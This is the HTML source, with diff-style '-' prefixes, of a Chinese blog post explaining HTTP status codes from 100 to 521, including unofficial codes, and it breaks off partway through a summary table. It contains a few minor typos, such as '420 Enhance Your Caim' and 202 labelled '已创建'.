-<p>以下是<strong>HTTP 状态码详解大全 | HTTP Status Codes”</strong> ，来自维基百科，可以按<code>Ctrl+F</code>快速查找需要的信息</p>
-</blockquote>
-<h2 id="1xx消息"><a href="#1xx消息" class="headerlink" title="1xx消息"></a>1xx消息</h2><p>这一类型的状态码，代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。由于HTTP&#x2F;1.0协议中没有定义任何1xx状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送1xx响应。[4] 这些状态码代表的响应都是信息性的，标示客户应该采取的其他行动。</p>
-<h3 id="100-Continue"><a href="#100-Continue" class="headerlink" title="100 Continue"></a>100 Continue</h3><p>服务器已经接收到请求头，并且客户端应继续发送请求主体（在需要发送身体的请求的情况下：例如，POST请求），或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。要使服务器检查请求的头部，客户端必须在其初始请求中发送Expect: 100-continue作为头部，并在发送正文之前接收100 Continue状态代码。响应代码417期望失败表示请求不应继续。[2]</p>
-<h3 id="101-Switching-Protocols"><a href="#101-Switching-Protocols" class="headerlink" title="101 Switching Protocols"></a>101 Switching Protocols</h3><p>服务器已经理解了客户端的请求，并将通过Upgrade消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在Upgrade消息头中定义的那些协议。[5] 只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的HTTP版本（如HTTP&#x2F;2）比旧版本更有优势，或者切换到一个实时且同步的协议（如WebSocket）以传送利用此类特性的资源。</p>
-<h3 id="102-Processing"><a href="#102-Processing" class="headerlink" title="102 Processing"></a>102 Processing</h3><p>WebDAV请求可能包含许多涉及文件操作的子请求，需要很长时间才能完成请求。该代码表示服务器已经收到并正在处理请求，但无响应可用。[6]这样可以防止客户端超时，并假设请求丢失。</p>
-<h2 id="2xx成功"><a href="#2xx成功" class="headerlink" title="2xx成功"></a>2xx成功</h2><p>这一类型的状态码，代表请求已成功被服务器接收、理解、并接受。[2]</p>
-<h3 id="200-OK"><a href="#200-OK" class="headerlink" title="200 OK"></a>200 OK</h3><p>请求已成功，请求所希望的响应头或数据体将随此响应返回。实际的响应将取决于所使用的请求方法。在GET请求中，响应将包含与请求的资源相对应的实体。在POST请求中，响应将包含描述或操作结果的实体。[7]</p>
-<h3 id="201-Created"><a href="#201-Created" class="headerlink" title="201 Created"></a>201 Created</h3><p>请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其URI已经随Location头信息返回。假如需要的资源无法及时创建的话，应当返回’202 Accepted’。[8]</p>
-<h3 id="202-Accepted"><a href="#202-Accepted" class="headerlink" title="202 Accepted"></a>202 Accepted</h3><p>服务器已接受请求，但尚未处理。最终该请求可能会也可能不会被执行，并且可能在处理发生时被禁止。[9]</p>
-<h3 id="203-Non-Authoritative-Information"><a href="#203-Non-Authoritative-Information" class="headerlink" title="203 Non-Authoritative Information"></a>203 Non-Authoritative Information</h3><p>服务器是一个转换代理服务器（transforming proxy，例如网络加速器），以200 OK状态码为起源，但回应了原始响应的修改版本。[10][11]</p>
-<h3 id="204-No-Content"><a href="#204-No-Content" class="headerlink" title="204 No Content"></a>204 No Content</h3><p>服务器成功处理了请求，没有返回任何内容。[12]</p>
-<h3 id="205-Reset-Content"><a href="#205-Reset-Content" class="headerlink" title="205 Reset Content"></a>205 Reset Content</h3><p>服务器成功处理了请求，但没有返回任何内容。与204响应不同，此响应要求请求者重置文档视图。[13]</p>
-<h3 id="206-Partial-Content"><a href="#206-Partial-Content" class="headerlink" title="206 Partial Content"></a>206 Partial Content</h3><p>服务器已经成功处理了部分GET请求。类似于FlashGet或者迅雷这类的HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。[14]</p>
-<h3 id="207-Multi-Status"><a href="#207-Multi-Status" class="headerlink" title="207 Multi-Status"></a>207 Multi-Status</h3><p>代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。[15]</p>
-<h3 id="208-Already-Reported"><a href="#208-Already-Reported" class="headerlink" title="208 Already Reported"></a>208 Already Reported</h3><p>DAV绑定的成员已经在（多状态）响应之前的部分被列举，且未被再次包含。</p>
-<h3 id="226-IM-Used"><a href="#226-IM-Used" class="headerlink" title="226 IM Used"></a>226 IM Used</h3><p>服务器已经满足了对资源的请求，对实体请求的一个或多个实体操作的结果表示。[16]</p>
-<h2 id="3xx重定向"><a href="#3xx重定向" class="headerlink" title="3xx重定向"></a>3xx重定向</h2><p>这类状态码代表需要客户端采取进一步的操作才能完成请求。通常，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的Location域中指明。[2]</p>
-<p>当且仅当后续的请求所使用的方法是GET或者HEAD时，用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求。客户端应当自动监测无限循环重定向（例如：A→B→C→……→A或A→A），因为这会导致服务器和客户端大量不必要的资源消耗。按照HTTP&#x2F;1.0版规范的建议，浏览器不应自动访问超过5次的重定向。[17]</p>
-<h3 id="300-Multiple-Choices"><a href="#300-Multiple-Choices" class="headerlink" title="300 Multiple Choices"></a>300 Multiple Choices</h3><p>被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。[18] 除非这是一个HEAD请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由Content-Type定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。当然，RFC 2616规范并没有规定这样的自动选择该如何进行。 如果服务器本身已经有了首选的回馈选择，那么在Location中应当指明这个回馈的URI；浏览器可能会将这个Location值作为自动重定向的地址。此外，除非额外指定，否则这个响应也是可缓存的。</p>
-<h3 id="301-Moved-Permanently"><a href="#301-Moved-Permanently" class="headerlink" title="301 Moved Permanently"></a>301 Moved Permanently</h3><p>被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个URI之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。[19]除非额外指定，否则这个响应也是可缓存的。 新的永久性的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。 如果这不是一个GET或者HEAD请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 注意：对于某些使用HTTP&#x2F;1.0协议的浏览器，当它们发送的POST请求得到了一个301响应的话，接下来的重定向请求将会变成GET方式。</p>
-<h3 id="302-Found"><a href="#302-Found" class="headerlink" title="302 Found"></a>302 Found</h3><p>要求客户端执行临时重定向（原始描述短语为“Moved Temporarily”）。[20]由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。 新的临时性的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。 如果这不是一个GET或者HEAD请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。 注意：虽然RFC 1945和RFC 2068规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将302响应视作为303响应，并且使用GET方式访问在Location中规定的URI，而无视原先请求的方法。[21]因此状态码303和307被添加了进来，用以明确服务器期待客户端进行何种反应。[22]</p>
-<h3 id="303-See-Other"><a href="#303-See-Other" class="headerlink" title="303 See Other"></a>303 See Other</h3><p>对应当前请求的响应可以在另一个URI上被找到，当响应于POST（或PUT &#x2F; DELETE）接收到响应时，客户端应该假定服务器已经收到数据，并且应该使用单独的GET消息发出重定向。[23]这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的URI不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。 新的URI应当在响应的Location域中返回。除非这是一个HEAD请求，否则响应的实体中应当包含指向新的URI的超链接及简短说明。 注意：许多HTTP&#x2F;1.1版以前的浏览器不能正确理解303状态。如果需要考虑与这些浏览器之间的互动，302状态码应该可以胜任，因为大多数的浏览器处理302响应时的方式恰恰就是上述规范要求客户端处理303响应时应当做的。</p>
-<h3 id="304-Not-Modified"><a href="#304-Not-Modified" class="headerlink" title="304 Not Modified"></a>304 Not Modified</h3><p>表示资源在由请求头中的If-Modified-Since或If-None-Match参数指定的这一版本之后，未曾被修改。在这种情况下，由于客户端仍然具有以前下载的副本，因此不需要重新传输资源。[24]</p>
-<h3 id="305-Use-Proxy"><a href="#305-Use-Proxy" class="headerlink" title="305 Use Proxy"></a>305 Use Proxy</h3><p>被请求的资源必须通过指定的代理才能被访问。Location域中将给出指定的代理所在的URI信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能创建305响应。许多HTTP客户端（像是Mozilla[25]和Internet Explorer）都没有正确处理这种状态代码的响应，主要是出于安全考虑。[26] 注意：RFC 2068中没有明确305响应是为了重定向一个单独的请求，而且只能被原始服务器建立。忽视这些限制可能导致严重的安全后果。</p>
-<h3 id="306-Switch-Proxy"><a href="#306-Switch-Proxy" class="headerlink" title="306 Switch Proxy"></a>306 Switch Proxy</h3><p>在最新版的规范中，306状态码已经不再被使用。最初是指“后续请求应使用指定的代理”。[27]</p>
-<h3 id="307-Temporary-Redirect"><a href="#307-Temporary-Redirect" class="headerlink" title="307 Temporary Redirect"></a>307 Temporary Redirect</h3><p>在这种情况下，请求应该与另一个URI重复，但后续的请求应仍使用原始的URI。 与302相反，当重新发出原始请求时，不允许更改请求方法。 例如，应该使用另一个POST请求来重复POST请求。[28]</p>
-<h3 id="308-Permanent-Redirect"><a href="#308-Permanent-Redirect" class="headerlink" title="308 Permanent Redirect"></a>308 Permanent Redirect</h3><p>请求和所有将来的请求应该使用另一个URI重复。 307和308重复302和301的行为，但不允许HTTP方法更改。 例如，将表单提交给永久重定向的资源可能会顺利进行。[29]</p>
-<h2 id="4xx客户端错误"><a href="#4xx客户端错误" class="headerlink" title="4xx客户端错误"></a>4xx客户端错误</h2><p>这类的状态码代表了客户端看起来可能发生了错误，妨碍了服务器的处理。除非响应的是一个HEAD请求，否则服务器就应该返回一个解释当前错误状况的实体，以及这是临时的还是永久性的状况。这些状态码适用于任何请求方法。浏览器应当向用户显示任何包含在此类错误响应中的实体内容。[30]</p>
-<p>如果错误发生时客户端正在传送数据，那么使用TCP的服务器实现应当仔细确保在关闭客户端与服务器之间的连接之前，客户端已经收到了包含错误信息的数据包。如果客户端在收到错误信息后继续向服务器发送数据，服务器的TCP栈将向客户端发送一个重置数据包，以清除该客户端所有还未识别的输入缓冲，以免这些数据被服务器上的应用程序读取并干扰后者。</p>
-<h3 id="400-Bad-Request"><a href="#400-Bad-Request" class="headerlink" title="400 Bad Request"></a>400 Bad Request</h3><p>由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求），服务器不能或不会处理该请求。[31]</p>
-<h3 id="401-Unauthorized"><a href="#401-Unauthorized" class="headerlink" title="401 Unauthorized"></a>401 Unauthorized</h3><p>参见：HTTP基本认证、HTTP摘要认证 类似于403 Forbidden，401语义即“未认证”，即用户没有必要的凭据。[32]该状态码表示当前请求需要用户验证。该响应必须包含一个适用于被请求资源的WWW-Authenticate信息头用以询问用户信息。客户端可以重复提交一个包含恰当的Authorization头信息的请求。[33]如果当前请求已经包含了Authorization证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。 注意：当网站（通常是网站域名）禁止IP地址时，有些网站状态码显示的401，表示该特定地址被拒绝访问网站。</p>
-<h3 id="402-Payment-Required"><a href="#402-Payment-Required" class="headerlink" title="402 Payment Required"></a>402 Payment Required</h3><p>该状态码是为了将来可能的需求而预留的。该状态码最初的意图可能被用作某种形式的数字现金或在线支付方案的一部分，但几乎没有哪家服务商使用，而且这个状态码通常不被使用。如果特定开发人员已超过请求的每日限制，Google Developers API会使用此状态码。[34]</p>
-<h3 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h3><p>主条目：HTTP 403 服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个HEAD请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。</p>
-<h3 id="404-Not-Found"><a href="#404-Not-Found" class="headerlink" title="404 Not Found"></a>404 Not Found</h3><p>主条目：HTTP 404 请求失败，请求所希望得到的资源未被在服务器上发现，但允许用户的后续请求。[35]没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。</p>
-<h3 id="405-Method-Not-Allowed"><a href="#405-Method-Not-Allowed" class="headerlink" title="405 Method Not Allowed"></a>405 Method Not Allowed</h3><p>请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow头信息用以表示出当前资源能够接受的请求方法的列表。例如，需要通过POST呈现数据的表单上的GET请求，或只读资源上的PUT请求。 鉴于PUT，DELETE方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回405错误。</p>
-<h3 id="406-Not-Acceptable"><a href="#406-Not-Acceptable" class="headerlink" title="406 Not Acceptable"></a>406 Not Acceptable</h3><p>参见：内容协商 请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体，该请求不可接受。[36] 除非这是一个HEAD请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址栏表的实体。实体的格式由Content-Type头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准。</p>
-<h3 id="407-Proxy-Authentication-Required"><a href="#407-Proxy-Authentication-Required" class="headerlink" title="407 Proxy Authentication Required"></a>407 Proxy Authentication Required</h3><p>与401响应类似，只不过客户端必须在代理服务器上进行身份验证。[37]代理服务器必须返回一个Proxy-Authenticate用以进行身份询问。客户端可以返回一个Proxy-Authorization信息头用以验证。</p>
-<h3 id="408-Request-Timeout"><a href="#408-Request-Timeout" class="headerlink" title="408 Request Timeout"></a>408 Request Timeout</h3><p>请求超时。根据HTTP规范，客户端没有在服务器预备等待的时间内完成一个请求的发送，客户端可以随时再次提交这一请求而无需进行任何更改。[38]</p>
-<h3 id="409-Conflict"><a href="#409-Conflict" class="headerlink" title="409 Conflict"></a>409 Conflict</h3><p>表示因为请求存在冲突无法处理该请求，例如多个同步更新之间的编辑冲突。</p>
-<h3 id="410-Gone"><a href="#410-Gone" class="headerlink" title="410 Gone"></a>410 Gone</h3><p>表示所请求的资源不再可用，将不再可用。当资源被有意地删除并且资源应被清除时，应该使用这个。在收到410状态码后，用户应停止再次请求资源。[39]但大多数服务端不会使用此状态码，而是直接使用404状态码。</p>
-<h3 id="411-Length-Required"><a href="#411-Length-Required" class="headerlink" title="411 Length Required"></a>411 Length Required</h3><p>服务器拒绝在没有定义Content-Length头的情况下接受请求。在添加了表明请求消息体长度的有效Content-Length头之后，客户端可以再次提交该请求。[40]</p>
-<h3 id="412-Precondition-Failed"><a href="#412-Precondition-Failed" class="headerlink" title="412 Precondition Failed"></a>412 Precondition Failed</h3><p>服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。[41]这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。</p>
-<h3 id="413-Request-Entity-Too-Large"><a href="#413-Request-Entity-Too-Large" class="headerlink" title="413 Request Entity Too Large"></a>413 Request Entity Too Large</h3><p>前称“Request Entity Too Large”，表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。[42]此种情况下，服务器可以关闭连接以免客户端继续发送此请求。 如果这个状况是临时的，服务器应当返回一个Retry-After的响应头，以告知客户端可以在多少时间以后重新尝试。</p>
-<h3 id="414-Request-URI-Too-Long"><a href="#414-Request-URI-Too-Long" class="headerlink" title="414 Request-URI Too Long"></a>414 Request-URI Too Long</h3><p>前称“Request-URI Too Long”，[43]表示请求的URI长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。通常将太多数据的结果编码为GET请求的查询字符串，在这种情况下，应将其转换为POST请求。[44]这比较少见，通常的情况包括： 本应使用POST方法的表单提交变成了GET方法，导致查询字符串过长。 重定向URI“黑洞”，例如每次重定向把旧的URI作为新的URI的一部分，导致在若干次重定向后URI超长。 客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的URI，当GET后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行[45]。没有此类漏洞的服务器，应当返回414状态码。</p>
-<h3 id="415-Unsupported-Media-Type"><a href="#415-Unsupported-Media-Type" class="headerlink" title="415 Unsupported Media Type"></a>415 Unsupported Media Type</h3><p>对于当前请求的方法和所请求的资源，请求中提交的互联网媒体类型并不是服务器中所支持的格式，因此请求被拒绝。例如，客户端将图像上传格式为svg，但服务器要求图像使用上传格式为jpg。</p>
-<h3 id="416-Requested-Range-Not-Satisfiable"><a href="#416-Requested-Range-Not-Satisfiable" class="headerlink" title="416 Requested Range Not Satisfiable"></a>416 Requested Range Not Satisfiable</h3><p>前称“Requested Range Not Satisfiable”。[46]客户端已经要求文件的一部分（Byte serving），但服务器不能提供该部分。例如，如果客户端要求文件的一部分超出文件尾端。[47]</p>
-<h3 id="417-Expectation-Failed"><a href="#417-Expectation-Failed" class="headerlink" title="417 Expectation Failed"></a>417 Expectation Failed</h3><p>在请求头Expect中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服显的证据证明在当前路由的下一个节点上，Expect的内容无法被满足。[48]</p>
-<h3 id="418-I’m-a-teapot"><a href="#418-I’m-a-teapot" class="headerlink" title="418 I’m a teapot"></a>418 I’m a teapot</h3><p>本操作码是在1998年作为IETF的传统愚人节笑话, 在RFC 2324超文本咖啡壶控制协议’中定义的，并不需要在真实的HTTP服务器中定义。当一个控制茶壶的HTCPCP收到BREW或POST指令要求其煮咖啡时应当回传此错误。[49]这个HTTP状态码在某些网站（包括Google.com）与项目（如Node.js、ASP.NET和Go语言）中用作彩蛋。[50]</p>
-<h3 id="420-Enhance-Your-Caim"><a href="#420-Enhance-Your-Caim" class="headerlink" title="420 Enhance Your Caim"></a>420 Enhance Your Caim</h3><p>Twitter Search与Trends API在客户端被限速的情况下返回。</p>
-<h3 id="421-Misdirected-Request"><a href="#421-Misdirected-Request" class="headerlink" title="421 Misdirected Request"></a>421 Misdirected Request</h3><p>该请求针对的是无法产生响应的服务器（例如因为连接重用）。[51]</p>
-<h3 id="422-Unprocessable-Entity"><a href="#422-Unprocessable-Entity" class="headerlink" title="422 Unprocessable Entity"></a>422 Unprocessable Entity</h3><p>请求格式正确，但是由于含有语义错误，无法响应。[15]</p>
-<h3 id="423-Locked"><a href="#423-Locked" class="headerlink" title="423 Locked"></a>423 Locked</h3><p>当前资源被锁定。[15]</p>
-<h3 id="424-Failed-Dependency"><a href="#424-Failed-Dependency" class="headerlink" title="424 Failed Dependency"></a>424 Failed Dependency</h3><p>由于之前的某个请求发生的错误，导致当前请求失败，例如PROPPATCH。[15]</p>
-<h3 id="425-Unordered-Collection"><a href="#425-Unordered-Collection" class="headerlink" title="425 Unordered Collection"></a>425 Unordered Collection</h3><p>在WebDAV Advanced Collections Protocol中定义，但Web Distributed Authoring and Versioning (WebDAV) Ordered Collections Protocol中并不存在。</p>
-<h3 id="426-Upgrade-Required"><a href="#426-Upgrade-Required" class="headerlink" title="426 Upgrade Required"></a>426 Upgrade Required</h3><p>客户端应当切换到TLS&#x2F;1.0，并在HTTP&#x2F;1.1 Upgrade header中给出。[15]</p>
-<h3 id="428-Precondition-Required"><a href="#428-Precondition-Required" class="headerlink" title="428 Precondition Required"></a>428 Precondition Required</h3><p>原服务器要求该请求满足一定条件。这是为了防止“‘未更新’问题，即客户端读取（GET）一个资源的状态，更改它，并将它写（PUT）回服务器，但这期间第三方已经在服务器上更改了该资源的状态，因此导致了冲突。”[52]</p>
-<h3 id="429-Too-Many-Requests"><a href="#429-Too-Many-Requests" class="headerlink" title="429 Too Many Requests"></a>429 Too Many Requests</h3><p>用户在给定的时间内发送了太多的请求。旨在用于网络限速。[52]</p>
-<h3 id="431-Request-Header-Fields-Too-Large"><a href="#431-Request-Header-Fields-Too-Large" class="headerlink" title="431 Request Header Fields Too Large"></a>431 Request Header Fields Too Large</h3><p>服务器不愿处理请求，因为一个或多个头字段过大。[52]</p>
-<h3 id="444-No-Response"><a href="#444-No-Response" class="headerlink" title="444 No Response"></a>444 No Response</h3><p>Nginx上HTTP服务器扩展。服务器不向客户端返回任何信息，并关闭连接（有助于阻止恶意软件）。</p>
-<h3 id="450-Blocked-by-Windows-Parental-Controls"><a href="#450-Blocked-by-Windows-Parental-Controls" class="headerlink" title="450 Blocked by Windows Parental Controls"></a>450 Blocked by Windows Parental Controls</h3><p>这是一个由Windows家庭控制（Microsoft）HTTP阻止的450状态代码的示例，用于信息和测试。</p>
-<h3 id="451-Unavailable-For-Legal-Reasons"><a href="#451-Unavailable-For-Legal-Reasons" class="headerlink" title="451 Unavailable For Legal Reasons"></a>451 Unavailable For Legal Reasons</h3><p>主条目：HTTP 451 该访问因法律的要求而被拒绝，由IETF在2015核准后新增加。[53][54][55]</p>
-<h3 id="494-Request-Header-Too-Large"><a href="#494-Request-Header-Too-Large" class="headerlink" title="494 Request Header Too Large"></a>494 Request Header Too Large</h3><p>在错误代码431提出之前Nginx上使用的扩展HTTP代码。</p>
-<h2 id="5xx服务器错误"><a href="#5xx服务器错误" class="headerlink" title="5xx服务器错误"></a>5xx服务器错误</h2><p>表示服务器无法完成明显有效的请求。[56]这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理。除非这是一个HEAD请求，否则服务器应当包含一个解释当前错误状态以及这个状况是临时的还是永久的解释信息实体。浏览器应当向用户展示任何在当前响应中被包含的实体。这些状态码适用于任何响应方法。[57]</p>
-<h3 id="500-Internal-Server-Error"><a href="#500-Internal-Server-Error" class="headerlink" title="500 Internal Server Error"></a>500 Internal Server Error</h3><p>通用错误消息，服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。没有给出具体错误信息。[58]</p>
-<h3 id="501-Not-Implemented"><a href="#501-Not-Implemented" class="headerlink" title="501 Not Implemented"></a>501 Not Implemented</h3><p>服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。[59]（例如，网络服务API的新功能）</p>
-<h3 id="502-Bad-Gateway"><a href="#502-Bad-Gateway" class="headerlink" title="502 Bad Gateway"></a>502 Bad Gateway</h3><p>作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。[60]</p>
-<h3 id="503-Service-Unavailable"><a href="#503-Service-Unavailable" class="headerlink" title="503 Service Unavailable"></a>503 Service Unavailable</h3><p>由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是暂时的，并且将在一段时间以后恢复。[61]如果能够预计延迟时间，那么响应中可以包含一个Retry-After头用以标明这个延迟时间。如果没有给出这个Retry-After信息，那么客户端应当以处理500响应的方式处理它。</p>
-<h3 id="504-Gateway-Timeout"><a href="#504-Gateway-Timeout" class="headerlink" title="504 Gateway Timeout"></a>504 Gateway Timeout</h3><p>作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI标识出的服务器，例如HTTP、FTP、LDAP）或者辅助服务器（例如DNS）收到响应。[62] 注意：某些代理服务器在DNS查询超时时会返回400或者500错误。</p>
-<h3 id="505-HTTP-Version-Not-Supported"><a href="#505-HTTP-Version-Not-Supported" class="headerlink" title="505 HTTP Version Not Supported"></a>505 HTTP Version Not Supported</h3><p>服务器不支持，或者拒绝支持在请求中使用的HTTP版本。[63]这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。</p>
-<h3 id="506-Variant-Also-Negotiates"><a href="#506-Variant-Also-Negotiates" class="headerlink" title="506 Variant Also Negotiates"></a>506 Variant Also Negotiates</h3><p>由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误，[64]被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。</p>
-<h3 id="507-Insufficient-Storage"><a href="#507-Insufficient-Storage" class="headerlink" title="507 Insufficient Storage"></a>507 Insufficient Storage</h3><p>服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。[15]</p>
-<h3 id="508-Loop-Detected"><a href="#508-Loop-Detected" class="headerlink" title="508 Loop Detected"></a>508 Loop Detected</h3><p>服务器在处理请求时陷入死循环。 （可代替 208状态码）</p>
-<h3 id="510-Not-Extended"><a href="#510-Not-Extended" class="headerlink" title="510 Not Extended"></a>510 Not Extended</h3><p>获取资源所需要的策略并没有被满足。[65]</p>
-<h3 id="511-Network-Authentication-Required"><a href="#511-Network-Authentication-Required" class="headerlink" title="511 Network Authentication Required"></a>511 Network Authentication Required</h3><p>客户端需要进行身份验证才能获得网络访问权限，旨在限制用户群访问特定网络。（例如连接WiFi热点时的强制网络门户）[52]</p>
-<h2 id="非官方状态码"><a href="#非官方状态码" class="headerlink" title="非官方状态码"></a>非官方状态码</h2><h3 id="420-Enhance-Your-Calm"><a href="#420-Enhance-Your-Calm" class="headerlink" title="420 Enhance Your Calm"></a>420 Enhance Your Calm</h3><p>据说早期 Twitter API 会在短期内提交太多需求的时候回传这个 Status Code，不过在新版 API 改为使用 429 Too Many Requests。</p>
-<h3 id="498-Invalid-Token"><a href="#498-Invalid-Token" class="headerlink" title="498 Invalid Token"></a>498 Invalid Token</h3><h3 id="499-Token-Required"><a href="#499-Token-Required" class="headerlink" title="499 Token Required"></a>499 Token Required</h3><p>这两个是以前一个叫做 ArcGIS for Server 的系统会回应的 Status Code。一般来说验证信息错误还是会回传 401 Unathorized。</p>
-<h3 id="520-Unknown-Error"><a href="#520-Unknown-Error" class="headerlink" title="520 Unknown Error"></a>520 Unknown Error</h3><p>Cloudflare 会用的未知错误。</p>
-<h3 id="521-Web-Server-Is-Down"><a href="#521-Web-Server-Is-Down" class="headerlink" title="521 Web Server Is Down"></a>521 Web Server Is Down</h3><p>指目标服务器挂了，一般在一些CDN上会出现（例如Cloudflare）</p>
-<hr>
-<h1 id="http状态码的逻辑关系图"><a href="#http状态码的逻辑关系图" class="headerlink" title="http状态码的逻辑关系图"></a>http状态码的逻辑关系图</h1><p><img src="https://config.net.cn/images/tools/httpstatus/httpstatuscode.png" alt="http状态码的逻辑关系图"></p>
-<h2 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h2><p>HTTP状态码(响应码)用来表明HTTP请求是否已经成功完成.HTTP响应类型一共分五大类:消息响应,成功响应,重定向,客户端错误,服务器端错误.</p>
-<p>下表列出了所有HTTP状态码,以及他们各自所代表的含义:</p>
-<table>
-<thead>
-<tr>
-<th align="center">状态码</th>
-<th align="left">原因短语</th>
-<th align="left">代表含义</th>
-<th align="left">HTTP 版本</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">消息响应</td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="center">100</td>
-<td align="left">Continue (继续)</td>
-<td align="left">客户端应当继续发送请求.这个临时响应是用来通知客户端它的部分请求已经被服务器接收,且仍未被拒绝.客户端应当继续发送请求的剩余部分,或者如果请求已经完成,忽略这个响应.服务器必须在请求完成后向客户端发送一个最终响应.</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">101</td>
-<td align="left">Switching Protocol (切换协议)</td>
-<td align="left">服务器已经理解了客户端的请求，并将通过Upgrade消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到 在Upgrade消息头中定义的那些协议。: 只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的HTTP版本比旧版本更有优势，或者切换到一个实时且同步的协议以传送利用此类特 性的资源。</td>
-<td align="left">HTTP&#x2F;1.1 可用</td>
-</tr>
-<tr>
-<td align="center">成功响应</td>
-<td align="left"></td>
-<td align="left"></td>
-<td align="left"></td>
-</tr>
-<tr>
-<td align="center">200</td>
-<td align="left">OK (成功)</td>
-<td align="left">请求成功.成功的意义根据请求所使用的方法不同而不同.GET: 资源已被提取,并作为响应体传回客户端.HEAD: 实体头已作为响应头传回客户端POST: 经过服务器处理客户端传来的数据,适合的资源作为响应体传回客户端.TRACE: 服务器收到请求消息作为响应体传回客户端.</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">201</td>
-<td align="left">Created (已创建)</td>
-<td align="left">请求成功，而且有一个新的资源已经依据请求的需要而建立，通常这是 PUT 方法得到的响应码.</td>
-<td align="left">HTTP&#x2F;0.9 可用</td>
-</tr>
-<tr>
-<td align="center">202</td>
-<td align="left">Accepted (已创建)</td>
